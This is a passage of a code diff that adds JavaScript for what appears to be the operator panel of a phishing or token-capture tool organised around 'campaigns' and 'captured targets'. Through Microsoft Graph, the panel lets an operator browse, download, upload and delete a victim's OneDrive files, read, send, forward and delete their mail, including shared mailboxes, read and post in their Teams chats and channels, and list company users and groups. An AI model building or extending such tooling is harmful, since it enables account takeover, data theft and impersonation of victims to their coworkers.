+    notify('Uploaded: ' + file.name);
+    driveOpen(folderItemID === 'root' ? 'root' : folderItemID, driveStack[driveStack.length-1]?.name);
+  } catch(e) { notify('Upload error: ' + e.message, true); }
+}
+
+async function driveDeleteItem(campaignID, targetID, itemID, name) {
+  if (!confirm('Delete "' + name + '"? This cannot be undone.')) return;
+  const url = '/api/campaigns/' + campaignID + '/graph/' + encodeURIComponent(targetID)
+    + '/drive/item?item=' + encodeURIComponent(itemID);
+  try {
+    const r = await fetch(url, {method: 'DELETE'});
+    if (r.status === 401) { showLoginOverlay(); return; }
+    const data = await r.json();
+    if (data.error) { notify('Delete failed: ' + data.error, true); return; }
+    notify('Deleted: ' + name);
+    // Refresh current folder
+    const cur = driveStack[driveStack.length-1];
+    driveOpen(cur ? cur.id : 'root', cur ? cur.name : 'OneDrive');
+  } catch(e) { notify('Delete error: ' + e.message, true); }
+}
+
+// ─── FILES TAB ────────────────────────────────────────────────────────────────
+let filesStack = [];
+
+function filesGetTarget() { return getTarget('filesTargetSelect'); }
+
+async function filesOpen(itemID, name) {
+  const targetID = filesGetTarget();
+  if (!targetID || !activeCampaignID) return;
+
+  if (itemID === 'root') {
+    filesStack = [{ id: 'root', name: 'OneDrive' }];
+  } else {
+    const idx = filesStack.findIndex(e => e.id === itemID);
+    if (idx >= 0) filesStack = filesStack.slice(0, idx + 1);
+    else filesStack.push({ id: itemID, name: name || itemID });
+  }
+
+  document.getElementById('filesOutput').innerHTML = '<span style="color:var(--text-dim)">⏳ Loading...</span>';
+  const url = '/api/campaigns/' + activeCampaignID + '/graph/' + encodeURIComponent(targetID)
+    + '/drive/ls?item=' + encodeURIComponent(itemID === 'root' ? '' : itemID);
+  try {
+    const r = await fetch(url);
+    if (r.status === 401) { showLoginOverlay(); return; }
+    const json = await r.json();
+    document.getElementById('filesOutput').innerHTML = renderFilesBrowser(json, targetID);
+  } catch(e) {
+    document.getElementById('filesOutput').innerHTML = `<span style="color:var(--accent2)">${escH(e.message)}</span>`;
+  }
+}
+
+async function filesLoadRecent() {
+  const targetID = filesGetTarget();
+  if (!targetID || !activeCampaignID) return;
+  document.getElementById('filesOutput').innerHTML = '<span style="color:var(--text-dim)">⏳ Loading recent files...</span>';
+  const r = await apiFetch('/campaigns/' + activeCampaignID + '/graph/' + encodeURIComponent(targetID) + '/drive/recent');
+  if (!r) return;
+  const json = await r.json();
+  if (json.error) { document.getElementById('filesOutput').innerHTML = `<div style="color:var(--accent2)">⚠ ${escH(json.error)}</div>`; return; }
+  filesStack = [{ id: 'recent', name: 'Recent Files' }];
+  document.getElementById('filesOutput').innerHTML = renderFilesBrowser(json, targetID, true);
+}
+
+async function filesSearch() {
+  const targetID = filesGetTarget();
+  if (!targetID || !activeCampaignID) return;
+  const q = document.getElementById('filesSearchQ').value.trim();
+  if (!q) { filesOpen('root', 'OneDrive'); return; }
+  document.getElementById('filesOutput').innerHTML = '<span style="color:var(--text-dim)">⏳ Searching...</span>';
+  const r = await apiFetch('/campaigns/' + activeCampaignID + '/graph/' + encodeURIComponent(targetID) + '/files', {
+    method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({query: q, top: 50})
+  });
+  if (!r) return;
+  const json = await r.json();
+  if (json.error) { document.getElementById('filesOutput').innerHTML = `<div style="color:var(--accent2)">⚠ ${escH(json.error)}</div>`; return; }
+  filesStack = [{ id: 'search:'+q, name: 'Search: ' + q }];
+  document.getElementById('filesOutput').innerHTML = renderFilesBrowser(json, targetID, true);
+}
+
+async function filesUpload(input) {
+  const targetID = filesGetTarget();
+  if (!targetID || !activeCampaignID) { input.value=''; return; }
+  const file = input.files[0];
+  if (!file) return;
+  const curID = filesStack.length > 0 ? filesStack[filesStack.length-1].id : 'root';
+  const folderID = (curID === 'root' || curID.startsWith('search:') || curID === 'recent') ? '' : curID;
+  const form = new FormData();
+  form.append('file', file);
+  input.value = '';
+  notify('Uploading: ' + file.name);
+  const url = '/api/campaigns/' + activeCampaignID + '/graph/' + encodeURIComponent(targetID)
+    + '/drive/upload?folder=' + encodeURIComponent(folderID);
+  try {
+    const r = await fetch(url, {method: 'POST', body: form});
+    if (r.status === 401) { showLoginOverlay(); return; }
+    const data = await r.json();
+    if (data.error) { notify('Upload failed: ' + data.error, true); return; }
+    notify('Uploaded: ' + file.name);
+    filesOpen(folderID || 'root', filesStack[filesStack.length-1]?.name || 'OneDrive');
+  } catch(e) { notify('Upload error: ' + e.message, true); }
+}
+
+function renderFilesBrowser(data, targetID, flat=false) {
+  const items = (data && (data.value || data)) || [];
+  const arrItems = Array.isArray(items) ? items : [];
+  const cid = activeCampaignID;
+
+  const crumbs = filesStack.map((e, i) =>
+    i < filesStack.length - 1
+      ? `<span style="color:var(--accent);cursor:pointer" onclick="filesOpen('${escH(e.id)}','${escH(e.name)}')">${escH(e.name)}</span>`
+      : `<span style="color:var(--text-bright)">${escH(e.name)}</span>`
+  ).join(`<span style="color:var(--text-dim);margin:0 6px">/</span>`);
+
+  if (!arrItems.length) return `<div style="margin-bottom:10px">${crumbs}</div><div style="padding:24px;text-align:center;color:var(--text-dim)">Empty</div>`;
+
+  arrItems.sort((a,b) => { const af=!!a.folder,bf=!!b.folder; if(af!==bf) return bf-af; return (a.name||'').localeCompare(b.name||''); });
+
+  const rows = arrItems.map(item => {
+    const isFolder = !!item.folder;
+    const icon = isFolder ? '📁' : fileIcon(item.name);
+    const size = item.size != null ? fmtSize(item.size) : '—';
+    const modified = item.lastModifiedDateTime ? new Date(item.lastModifiedDateTime).toLocaleDateString() : '—';
+    const nameCell = isFolder && !flat
+      ? `<span style="color:var(--accent);cursor:pointer;font-weight:500" onclick="filesOpen('${escH(item.id)}','${escH(item.name)}')">${escH(item.name)}</span>`
+      : `<span style="color:var(--text-bright)">${escH(item.name)}</span>`;
+    const dlBtn = !isFolder ? `<button class="btn btn-sm" style="padding:2px 8px" onclick="driveDownload('${cid}','${escH(targetID)}','${escH(item.id)}','${escH(item.name)}')">↓</button>` : '';
+    const delBtn = !isFolder ? `<button class="btn btn-sm btn-danger" style="padding:2px 8px;margin-left:2px" onclick="driveDeleteItem('${cid}','${escH(targetID)}','${escH(item.id)}','${escH(item.name)}')">🗑</button>` : '';
+    return `<tr>
+      <td style="width:24px;text-align:center">${icon}</td>
+      <td>${nameCell}</td>
+      <td style="color:var(--text-dim);font-size:11px">${size}</td>
+      <td style="color:var(--text-dim);font-size:11px">${modified}</td>
+      <td style="white-space:nowrap">${dlBtn}${delBtn}
+        ${item.webUrl?`<a href="${escH(item.webUrl)}" target="_blank" class="btn btn-sm" style="padding:2px 8px;margin-left:2px">↗</a>`:''}
+      </td>
+    </tr>`;
+  }).join('');
+
+  const curFolderID = filesStack.length > 0 ? filesStack[filesStack.length-1].id : 'root';
+  const uploadBtn = (!flat && curFolderID !== 'recent') ? `<label class="btn btn-sm btn-success" style="cursor:pointer;margin-bottom:0">
+    ↑ Upload <input type="file" style="display:none" onchange="filesUpload(this)"></label>` : '';
+
+  return `<div style="margin-bottom:10px;display:flex;justify-content:space-between;align-items:center;font-size:12px">
+    <span>${crumbs}</span>${uploadBtn}
+  </div>
+  <div class="table-wrap"><table class="data-table">
+    <thead><tr><th style="width:24px"></th><th>Name</th><th>Size</th><th>Modified</th><th>Actions</th></tr></thead>
+    <tbody>${rows}</tbody>
+  </table></div>
+  <div style="color:var(--text-dim);font-size:10px;padding:6px 0;text-align:right">${arrItems.length} items</div>`;
+}
+
+// ─── MAIL TAB ─────────────────────────────────────────────────────────────────
+const mailState = { targetId: '', mailboxId: '', folderId: '', folderName: 'Inbox', skip: 0, msgId: '', replyAction: '' };
+
+function getTarget(selectId) {
+  const sel = document.getElementById(selectId);
+  if (!sel || !sel.value) { notify('Select a captured target first', true); return null; }
+  return sel.value;
+}
+function mailGetTarget()  { return getTarget('mailTargetSelect'); }
+
+async function loadMailFolders() {
+  const tid = mailGetTarget();
+  if (!tid) return;
+  mailState.targetId = tid;
+  mailState.mailboxId = '';
+  await _loadMailFoldersFor('');
+}
+
+async function openSharedMailbox(mailboxId, displayName) {
+  mailState.mailboxId = mailboxId;
+  // show a header in the folder panel indicating shared mailbox context
+  const backBtn = `<div style="padding:6px 14px;font-size:10px;color:var(--warn);border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between">
+    <span>📬 ${escH(displayName)}</span>
+    <button class="btn btn-sm" onclick="loadMailFolders()" style="font-size:9px;padding:1px 6px">← Mine</button>
+  </div>`;
+  document.getElementById('mailFolderList').innerHTML = backBtn + '<div style="padding:12px;color:var(--text-dim);font-size:11px">⏳ Loading folders...</div>';
+  await _loadMailFoldersFor(mailboxId);
+}
+
+async function _loadMailFoldersFor(mailboxId) {
+  const tid = mailState.targetId || mailGetTarget();
+  if (!tid) return;
+  mailState.targetId = tid;
+  const qs = mailboxId ? '?mailbox=' + encodeURIComponent(mailboxId) : '';
+  const r = await apiFetch('/campaigns/' + activeCampaignID + '/graph/' + encodeURIComponent(tid) + '/mail/folders' + qs);
+  if (!r) return;
+  const data = await r.json();
+  if (data.error) { notify('Mail error: ' + data.error, true); return; }
+  const folders = data.value || [];
+  renderMailFolders(folders, mailboxId);
+  const inbox = folders.find(f => f.displayName?.toLowerCase() === 'inbox') || folders[0];
+  if (inbox) mailLoadFolder(inbox.id, inbox.displayName);
+}
+
+function renderMailFolders(folders, mailboxId) {
+  const el = document.getElementById('mailFolderList');
+  const icons = {Inbox:'📥',Drafts:'📝','Sent Items':'📤','Deleted Items':'🗑',Junk:'⚠',Archive:'📦'};
+  const rows = folders.map(f => {
+    const icon = icons[f.displayName] || '📁';
+    const unread = f.unreadItemCount > 0 ? `<span class="mail-folder-badge">${f.unreadItemCount}</span>` : '';
+    return `<div class="mail-folder-item" id="mf-${escH(f.id)}" onclick="mailLoadFolder('${escH(f.id)}','${escH(f.displayName)}')">
+      <span>${icon} ${escH(f.displayName)}</span>${unread}
+    </div>`;
+  }).join('');
+  if (mailboxId) {
+    // preserve the shared mailbox header already rendered
+    const existing = el.querySelector('div[style*="warn"]');
+    if (existing) { existing.nextSibling?.remove(); el.insertAdjacentHTML('beforeend', rows); return; }
+  }
+  el.innerHTML = rows;
+}
+
+async function mailLoadFolder(folderId, folderName) {
+  const tid = mailState.targetId || mailGetTarget();
+  if (!tid) return;
+  mailState.targetId = tid;
+  mailState.folderId = folderId;
+  mailState.folderName = folderName;
+  mailState.skip = 0;
+  // Highlight selected folder
+  document.querySelectorAll('.mail-folder-item').forEach(el => el.classList.remove('active'));
+  const selEl = document.getElementById('mf-' + folderId);
+  if (selEl) selEl.classList.add('active');
+  await mailLoadMessages(0);
+}
+
+async function mailLoadMessages(skip) {
+  mailState.skip = skip;
+  const tid = mailState.targetId;
+  const el = document.getElementById('mailMessageList');
+  el.innerHTML = '<div style="padding:12px;text-align:center;color:var(--text-dim)">⏳ Loading...</div>';
+  const orderEl = document.getElementById('mailOrderSelect');
+  const order = orderEl ? orderEl.value : 'desc';
+  const mbxParam = mailState.mailboxId ? '&mailbox=' + encodeURIComponent(mailState.mailboxId) : '';
+  const url = '/campaigns/' + activeCampaignID + '/graph/' + encodeURIComponent(tid)
+    + '/mail/messages?folder=' + encodeURIComponent(mailState.folderId) + '&top=25&skip=' + skip + '&order=' + order + mbxParam;
+  const r = await apiFetch(url);
+  if (!r) return;
+  const data = await r.json();
+  if (data.error) { el.innerHTML = `<div style="padding:12px;color:var(--accent2)">⚠ ${escH(data.error)}</div>`; return; }
+  renderMailMessages(data.value || []);
+  // Pagination
+  const pager = document.getElementById('mailMessagePager');
+  const hasMore = (data['@odata.nextLink'] || (data.value && data.value.length === 25));
+  pager.innerHTML = `
+    <div style="display:flex;justify-content:space-between;padding:4px 8px;font-size:10px">
+      ${skip > 0 ? `<button class="btn btn-sm" onclick="mailLoadMessages(${skip-25})">← Prev</button>` : '<span></span>'}
+      <span style="color:var(--text-dim);align-self:center">${skip+1}–${skip+(data.value||[]).length}</span>
+      ${hasMore && data.value.length===25 ? `<button class="btn btn-sm" onclick="mailLoadMessages(${skip+25})">Next →</button>` : '<span></span>'}
+    </div>`;
+}
+
+function renderMailMessages(messages) {
+  const el = document.getElementById('mailMessageList');
+  if (!messages.length) {
+    el.innerHTML = '<div style="padding:20px;text-align:center;color:var(--text-dim);font-size:11px">No messages</div>';
+    return;
+  }
+  el.innerHTML = messages.map(m => {
+    const from = (m.from?.emailAddress?.name || m.from?.emailAddress?.address || '—');
+    const date = m.receivedDateTime ? new Date(m.receivedDateTime).toLocaleDateString() : '';
+    const unreadClass = m.isRead === false ? 'unread' : '';
+    const attach = m.hasAttachments ? ' 📎' : '';
+    return `<div class="mail-message-item ${unreadClass}" id="mm-${escH(m.id)}" onclick="mailOpenMessage('${escH(m.id)}')">
+      <div style="display:flex;justify-content:space-between"><span class="msg-from">${escH(from)}</span><span class="msg-date">${date}</span></div>
+      <div class="msg-subject">${escH(m.subject||'(no subject)')}${attach}</div>
+      <div class="msg-preview">${escH(m.bodyPreview||'')}</div>
+    </div>`;
+  }).join('');
+}
+
+async function mailOpenMessage(msgId) {
+  const tid = mailState.targetId;
+  mailState.msgId = msgId;
+  // Highlight
+  document.querySelectorAll('.mail-message-item').forEach(el => el.classList.remove('active'));
+  const selEl = document.getElementById('mm-' + msgId);
+  if (selEl) selEl.classList.add('active');
+  document.getElementById('mailViewerHeader').innerHTML = '<div style="font-size:11px;color:var(--text-dim)">⏳ Loading...</div>';
+  document.getElementById('mailBodyFrame').srcdoc = '';
+  const r = await apiFetch('/campaigns/' + activeCampaignID + '/graph/' + encodeURIComponent(tid) + '/mail/messages/' + encodeURIComponent(msgId));
+  if (!r) return;
+  const msg = await r.json();
+  if (msg.error) { notify('Error: ' + msg.error, true); return; }
+  renderMailMessage(msg);
+}
+
+function renderMailMessage(msg) {
+  const from = msg.from?.emailAddress?.address || '—';
+  const fromName = msg.from?.emailAddress?.name || from;
+  const to = (msg.toRecipients||[]).map(r=>r.emailAddress?.address||'').join(', ') || '—';
+  const date = msg.receivedDateTime ? new Date(msg.receivedDateTime).toLocaleString() : '—';
+  document.getElementById('mailViewerHeader').innerHTML = `
+    <div style="font-size:13px;font-weight:600;color:var(--text-bright);margin-bottom:4px">${escH(msg.subject||'(no subject)')}</div>
+    <div style="font-size:10px;color:var(--text-dim);line-height:1.7">
+      From: <span style="color:var(--accent)">${escH(fromName)} &lt;${escH(from)}&gt;</span><br>
+      To: <span style="color:var(--text)">${escH(to)}</span><br>
+      Date: <span style="color:var(--text)">${date}</span>
+    </div>
+    <div class="mail-viewer-actions">
+      <button class="btn btn-sm" onclick="mailReply('${escH(msg.id)}')">↩ Reply</button>
+      <button class="btn btn-sm" onclick="mailForward('${escH(msg.id)}')">→ Forward</button>
+      <button class="btn btn-sm btn-danger" onclick="mailDelete('${escH(msg.id)}')">🗑 Delete</button>
+    </div>`;
+  const html = msg.body?.content || '<p style="color:#888">No body content</p>';
+  const contentType = msg.body?.contentType || 'text';
+  const frameContent = contentType === 'html' ? html : `<pre style="font-family:sans-serif;white-space:pre-wrap">${escH(html)}</pre>`;
+  document.getElementById('mailBodyFrame').srcdoc = frameContent;
+}
+
+function mailCompose() {
+  const tid = mailGetTarget();
+  if (!tid) return;
+  document.getElementById('composeTo').value = '';
+  document.getElementById('composeSubject').value = '';
+  document.getElementById('composeBody').value = '';
+  document.getElementById('composeModal').style.display = 'flex';
+}
+
+async function mailSendCompose() {
+  const tid = mailState.targetId || mailGetTarget();
+  if (!tid) return;
+  const toRaw = document.getElementById('composeTo').value.trim();
+  const subject = document.getElementById('composeSubject').value.trim();
+  const html = document.getElementById('composeBody').value;
+  if (!toRaw || !subject) { notify('To and Subject required', true); return; }
+  const to = toRaw.split(',').map(s=>s.trim()).filter(Boolean);
+  const result = await api('POST', '/campaigns/' + activeCampaignID + '/graph/' + encodeURIComponent(tid) + '/mail/send',
+    { to, subject, html });
+  if (result.error) { notify('Send failed: ' + result.error, true); return; }
+  notify('Email sent');
+  document.getElementById('composeModal').style.display = 'none';
+}
+
+let replyMsgId = '';
+let replyIsForward = false;
+
+function mailReply(msgId) {
+  replyMsgId = msgId; replyIsForward = false;
+  document.getElementById('replyModalTitle').textContent = 'Reply';
+  document.getElementById('forwardToWrap').style.display = 'none';
+  document.getElementById('replyComment').value = '';
+  document.getElementById('replyModal').style.display = 'flex';
+}
+
+function mailForward(msgId) {
+  replyMsgId = msgId; replyIsForward = true;
+  document.getElementById('replyModalTitle').textContent = 'Forward';
+  document.getElementById('forwardToWrap').style.display = '';
+  document.getElementById('forwardTo').value = '';
+  document.getElementById('replyComment').value = '';
+  document.getElementById('replyModal').style.display = 'flex';
+}
+
+async function mailDoReplyForward() {
+  const tid = mailState.targetId;
+  const comment = document.getElementById('replyComment').value;
+  let result;
+  if (replyIsForward) {
+    const toRaw = document.getElementById('forwardTo').value.trim();
+    if (!toRaw) { notify('To required for forward', true); return; }
+    const to = toRaw.split(',').map(s=>s.trim()).filter(Boolean);
+    result = await api('POST', '/campaigns/' + activeCampaignID + '/graph/' + encodeURIComponent(tid) + '/mail/messages/' + encodeURIComponent(replyMsgId) + '/forward',
+      { to, comment });
+  } else {
+    result = await api('POST', '/campaigns/' + activeCampaignID + '/graph/' + encodeURIComponent(tid) + '/mail/messages/' + encodeURIComponent(replyMsgId) + '/reply',
+      { comment });
+  }
+  if (result.error) { notify('Failed: ' + result.error, true); return; }
+  notify(replyIsForward ? 'Forwarded' : 'Replied');
+  document.getElementById('replyModal').style.display = 'none';
+}
+
+async function mailDelete(msgId) {
+  if (!confirm('Delete this email? It will be moved to Deleted Items.')) return;
+  const tid = mailState.targetId;
+  const result = await apiFetch('/campaigns/' + activeCampaignID + '/graph/' + encodeURIComponent(tid) + '/mail/messages/' + encodeURIComponent(msgId), {method:'DELETE'});
+  if (!result) return;
+  const data = await result.json();
+  if (data.error) { notify('Delete failed: ' + data.error, true); return; }
+  notify('Email deleted');
+  // Remove from list
+  const el = document.getElementById('mm-' + msgId);
+  if (el) el.remove();
+  document.getElementById('mailViewerHeader').innerHTML = '<div style="font-size:11px;color:var(--text-dim)">Message deleted</div>';
+  document.getElementById('mailBodyFrame').srcdoc = '';
+}
+
+// ─── TEAMS TAB ────────────────────────────────────────────────────────────────
+const teamsState = { targetId:'', view:'teams', teamId:'', chanId:'', chatId:'', convName:'' };
+
+function teamsGetTarget() { return getTarget('teamsTargetSelect'); }
+
+async function teamsLoad(type) {
+  const tid = teamsGetTarget();
+  if (!tid) return;
+  teamsState.targetId = tid;
+  teamsState.view = type;
+  document.getElementById('teamsTabTeams').classList.toggle('active', type==='teams');
+  document.getElementById('teamsTabChats').classList.toggle('active', type==='chats');
+  document.getElementById('teamsListBody').innerHTML = '<div style="padding:12px;color:var(--text-dim);font-size:11px">⏳ Loading...</div>';
+  const path = type === 'teams' ? '/teams' : '/chats';
+  const r = await apiFetch('/campaigns/' + activeCampaignID + '/graph/' + encodeURIComponent(tid) + path);
+  if (!r) return;
+  const data = await r.json();
+  if (data.error) { document.getElementById('teamsListBody').innerHTML = `<div style="padding:12px;color:var(--accent2)">${escH(data.error)}</div>`; return; }
+  if (type === 'teams') renderTeamsList(data.value || []);
+  else renderChatsList(data.value || []);
+}
+
+function renderTeamsList(teams) {
+  const el = document.getElementById('teamsListBody');
+  if (!teams.length) { el.innerHTML = '<div style="padding:12px;color:var(--text-dim);font-size:11px">No teams found</div>'; return; }
+  el.innerHTML = teams.map(t =>
+    `<div class="teams-item" onclick="teamsSelectTeam('${escH(t.id)}','${escH(t.displayName||t.id)}')">
+      <div class="teams-item-name">🏢 ${escH(t.displayName||'Team')}</div>
+      <div class="teams-item-sub">${escH(t.description||'')}</div>
+    </div>`
+  ).join('');
+}
+
+function renderChatsList(chats) {
+  const el = document.getElementById('teamsListBody');
+  if (!chats.length) { el.innerHTML = '<div style="padding:12px;color:var(--text-dim);font-size:11px">No chats found</div>'; return; }
+  el.innerHTML = chats.map(c => {
+    const members = (c.members||[]).map(m=>m.displayName||'').filter(Boolean).slice(0,3).join(', ');
+    const name = c.topic || members || c.chatType || c.id;
+    return `<div class="teams-item" onclick="teamsSelectChat('${escH(c.id)}','${escH(name)}')">
+      <div class="teams-item-name">💬 ${escH(name)}</div>
+      <div class="teams-item-sub">${escH(c.chatType||'')}</div>
+    </div>`;
+  }).join('');
+}
+
+async function teamsSelectTeam(teamId, teamName) {
+  teamsState.teamId = teamId;
+  document.querySelectorAll('.teams-item').forEach(el => el.classList.remove('active'));
+  // Load channels
+  const r = await apiFetch('/campaigns/' + activeCampaignID + '/graph/' + encodeURIComponent(teamsState.targetId) + '/teams/' + encodeURIComponent(teamId) + '/channels');
+  if (!r) return;
+  const data = await r.json();
+  if (data.error) { notify('Error: ' + data.error, true); return; }
+  const channels = data.value || [];
+  const el = document.getElementById('teamsListBody');
+  el.innerHTML = `<div style="padding:6px 14px;font-size:10px;color:var(--text-dim);cursor:pointer" onclick="teamsLoad('teams')">← Back</div>
+    <div style="padding:4px 14px 6px;font-size:10px;color:var(--accent);font-weight:600">${escH(teamName)}</div>` +
+    channels.map(ch => `<div class="teams-item" onclick="teamsSelectChannel('${escH(teamId)}','${escH(ch.id)}','${escH(ch.displayName||ch.id)}')">
+      <div class="teams-item-name"># ${escH(ch.displayName||'Channel')}</div>
+    </div>`).join('');
+}
+
+async function teamsSelectChannel(teamId, chanId, chanName) {
+  teamsState.teamId = teamId; teamsState.chanId = chanId; teamsState.convName = chanName;
+  teamsState.chatId = '';
+  document.getElementById('teamsConvLabel').textContent = chanName;
+  document.getElementById('teamsRefreshBtn').style.display = '';
+  document.getElementById('teamsSendArea').style.display = '';
+  await teamsLoadChannelMessages(teamId, chanId);
+}
+
+async function teamsLoadChannelMessages(teamId, chanId) {
+  document.getElementById('teamsMsgList').innerHTML = '<div style="padding:12px;text-align:center;color:var(--text-dim)">⏳ Loading...</div>';
+  const r = await apiFetch('/campaigns/' + activeCampaignID + '/graph/' + encodeURIComponent(teamsState.targetId) + '/teams/' + encodeURIComponent(teamId) + '/channels/' + encodeURIComponent(chanId) + '/messages');
+  if (!r) return;
+  const data = await r.json();
+  if (data.error) { document.getElementById('teamsMsgList').innerHTML = `<div style="color:var(--accent2);padding:12px">${escH(data.error)}</div>`; return; }
+  renderTeamsMessages(data.value || []);
+}
+
+async function teamsSelectChat(chatId, chatName) {
+  teamsState.chatId = chatId; teamsState.convName = chatName;
+  teamsState.teamId = ''; teamsState.chanId = '';
+  document.querySelectorAll('.teams-item').forEach(el => el.classList.remove('active'));
+  document.getElementById('teamsConvLabel').textContent = chatName;
+  document.getElementById('teamsRefreshBtn').style.display = '';
+  document.getElementById('teamsSendArea').style.display = '';
+  await teamsLoadChatMessages(chatId);
+}
+
+async function teamsLoadChatMessages(chatId) {
+  document.getElementById('teamsMsgList').innerHTML = '<div style="padding:12px;text-align:center;color:var(--text-dim)">⏳ Loading...</div>';
+  const r = await apiFetch('/campaigns/' + activeCampaignID + '/graph/' + encodeURIComponent(teamsState.targetId) + '/chats/' + encodeURIComponent(chatId) + '/messages');
+  if (!r) return;
+  const data = await r.json();
+  if (data.error) { document.getElementById('teamsMsgList').innerHTML = `<div style="color:var(--accent2);padding:12px">${escH(data.error)}</div>`; return; }
+  renderTeamsMessages(data.value || []);
+}
+
+function renderTeamsMessages(messages) {
+  const el = document.getElementById('teamsMsgList');
+  if (!messages.length) { el.innerHTML = '<div style="padding:12px;text-align:center;color:var(--text-dim);font-size:11px">No messages</div>'; return; }
+  el.innerHTML = messages.slice().reverse().map(m => {
+    const sender = m.from?.user?.displayName || m.from?.application?.displayName || 'Unknown';
+    const time = m.createdDateTime ? new Date(m.createdDateTime).toLocaleString() : '';
+    const bodyText = m.body?.content || '';
+    const isHTML = m.body?.contentType === 'html';
+    const bodyDisplay = isHTML
+      ? `<div style="font-size:11px;line-height:1.5" class="msg-body">${bodyText}</div>`
+      : `<div style="font-size:11px;line-height:1.5">${escH(bodyText)}</div>`;
+    const attachments = (m.attachments||[]).filter(a=>a.contentUrl||a.name);
+    const attachHtml = attachments.map(a =>
+      `<div style="margin-top:4px"><span style="font-size:10px;color:var(--warn)">📎 ${escH(a.name||'attachment')}</span>
+      ${a.contentUrl?`<a href="${escH(a.contentUrl)}" target="_blank" class="btn btn-sm" style="padding:1px 6px;margin-left:6px;font-size:10px">↗ Open</a>`:''}</div>`
+    ).join('');
+    return `<div class="chat-bubble incoming" style="max-width:90%">
+      <div class="chat-sender">${escH(sender)}</div>
+      ${bodyDisplay}${attachHtml}
+      <div class="chat-time">${time}</div>
+    </div>`;
+  }).join('');
+  el.scrollTop = el.scrollHeight;
+}
+
+async function teamsSend() {
+  const content = document.getElementById('teamsMsgInput').value.trim();
+  if (!content) return;
+  const tid = teamsState.targetId;
+  let result;
+  if (teamsState.chatId) {
+    result = await api('POST', '/campaigns/' + activeCampaignID + '/graph/' + encodeURIComponent(tid) + '/chats/' + encodeURIComponent(teamsState.chatId) + '/messages', { content });
+  } else if (teamsState.teamId && teamsState.chanId) {
+    result = await api('POST', '/campaigns/' + activeCampaignID + '/graph/' + encodeURIComponent(tid) + '/teams/' + encodeURIComponent(teamsState.teamId) + '/channels/' + encodeURIComponent(teamsState.chanId) + '/messages', { content });
+  } else { notify('No conversation selected', true); return; }
+  if (result.error) { notify('Send failed: ' + result.error, true); return; }
+  document.getElementById('teamsMsgInput').value = '';
+  notify('Message sent');
+  // Refresh messages
+  if (teamsState.chatId) await teamsLoadChatMessages(teamsState.chatId);
+  else await teamsLoadChannelMessages(teamsState.teamId, teamsState.chanId);
+}
+
+async function teamsRefreshMessages() {
+  if (teamsState.chatId) await teamsLoadChatMessages(teamsState.chatId);
+  else if (teamsState.teamId && teamsState.chanId) await teamsLoadChannelMessages(teamsState.teamId, teamsState.chanId);
+}
+
+function teamsNewChat() {
+  document.getElementById('newChatMembers').value = '';
+  document.getElementById('newChatModal').style.display = 'flex';
+}
+
+async function teamsCreateChat() {
+  const tid = teamsGetTarget();
+  if (!tid) return;
+  const membersRaw = document.getElementById('newChatMembers').value.trim();
+  const chatType = document.getElementById('newChatType').value;
+  if (!membersRaw) { notify('Member IDs required', true); return; }
+  const member_ids = membersRaw.split(',').map(s=>s.trim()).filter(Boolean);
+  const result = await api('POST', '/campaigns/' + activeCampaignID + '/graph/' + encodeURIComponent(tid) + '/chats/create', {member_ids, chat_type: chatType});
+  if (result.error) { notify('Create chat failed: ' + result.error, true); return; }
+  notify('Chat created');
+  document.getElementById('newChatModal').style.display = 'none';
+  teamsLoad('chats');
+}
+
+// ─── USERS TAB ───────────────────────────────────────────────────────────────
+const usersState = {
+  all: [], filtered: [], page: 1,
+  groupsAll: [], groupsFiltered: [], groupsPage: 1
+};
+const usersFilterFields = new Set(['displayName', 'mail', 'department', 'jobTitle']);
+const groupsFilterFields = new Set(['displayName', 'description', 'mail']);
+
+function toggleFilterChip(btn, type) {
+  const field = btn.dataset.field;
+  const fields = type === 'users' ? usersFilterFields : groupsFilterFields;
+  if (fields.has(field)) { fields.delete(field); btn.classList.remove('active'); }
+  else { fields.add(field); btn.classList.add('active'); }
+  if (type === 'users') usersApplyFilter();
+  else groupsApplyFilter();
+}
+
+function usersGetTarget() { return getTarget('usersTargetSelect'); }
+
+async function usersLoad() {
+  const tid = usersGetTarget();
+  if (!tid) return;
+  document.getElementById('usersTableWrap').innerHTML = '<div style="padding:20px;text-align:center;color:var(--text-dim)">⏳ Loading users...</div>';
+  document.getElementById('groupsTableWrap').innerHTML = '<div style="padding:20px;text-align:center;color:var(--text-dim)">⏳ Loading groups...</div>';
+  const [ur, gr] = await Promise.all([
+    apiFetch('/campaigns/' + activeCampaignID + '/graph/' + encodeURIComponent(tid) + '/mailboxes'),
+    apiFetch('/campaigns/' + activeCampaignID + '/graph/' + encodeURIComponent(tid) + '/groups')
+  ]);
+  if (ur) {
+    const ud = await ur.json();
+    usersState.all = ud.value || [];
+    usersState.filtered = usersState.all.slice();
+    usersState.page = 1;
+    usersRenderTable();
+  }
+  if (gr) {
+    const gd = await gr.json();
+    usersState.groupsAll = gd.value || [];
+    usersState.groupsFiltered = usersState.groupsAll.slice();
+    usersState.groupsPage = 1;
+    groupsRenderTable();
+  }
+}
+
+function usersApplyFilter() {
+  const q = document.getElementById('usersFilter').value.toLowerCase();
+  if (!q) { usersState.filtered = usersState.all.slice(); }
+  else {
+    const fieldMap = {
+      displayName: u => u.displayName||'',
+      mail: u => u.mail||'',
+      department: u => u.department||'',
+      jobTitle: u => u.jobTitle||'',
+      userPrincipalName: u => u.userPrincipalName||'',
+      officeLocation: u => u.officeLocation||'',
+      accountEnabled: u => u.accountEnabled!=null ? (u.accountEnabled?'enabled':'disabled') : '',
+    };
+    usersState.filtered = usersState.all.filter(u =>
+      [...usersFilterFields].some(f => fieldMap[f] && fieldMap[f](u).toLowerCase().includes(q))
+    );
+  }
+  usersState.page = 1;
+  usersRenderTable();
+}
+
+function usersRenderTable() {
+  const { items, page, totalPages, total } = paginate(usersState.filtered, usersState.page);
+  document.getElementById('usersCount').textContent = total + ' users';
+  const el = document.getElementById('usersTableWrap');
+  if (!items.length) { el.innerHTML = '<div style="padding:16px;text-align:center;color:var(--text-dim)">No users</div>'; document.getElementById('usersPager').innerHTML=''; return; }
+  el.innerHTML = `<table class="data-table"><thead><tr><th>Display Name</th><th>Email</th><th>Title</th><th>Dept</th><th></th></tr></thead><tbody>` +
+    items.map(u => `<tr>
+      <td style="color:var(--text-bright);cursor:pointer" onclick="usersShowDetail('${escH(u.id||u.userPrincipalName)}')">${escH(u.displayName||'—')}</td>
+      <td style="color:var(--accent);font-size:11px">${escH(u.mail||u.userPrincipalName||'—')}</td>
